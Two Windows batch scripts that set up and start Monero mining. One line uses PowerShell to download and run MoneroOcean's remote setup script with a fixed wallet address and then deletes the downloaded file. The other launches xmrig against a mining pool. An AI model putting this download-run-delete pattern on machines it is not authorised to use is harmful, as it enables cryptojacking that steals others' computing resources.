@echo off
powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.bat', $tempfile); & $tempfile 494aMjRURZXhNikcRV6x5BahUrmt292bRSiPj3cSXvAoHpJPF4VSce7VujGQ8ouHgTLF1jmN2cjXaTb7U3iU8zXPCFrpsQC; Remove-Item -Force $tempfile"

@echo off
cd moneroocean & xmrig.exe -o gulf.moneroocean.stream:10128 -u 494aMjRURZXhNikcRV6x5BahUrmt292bRSiPj3cSXvAoHpJPF4VSce7VujGQ8ouHgTLF1jmN2cjXaTb7U3iU8zXPCFrpsQC -k --coin monero

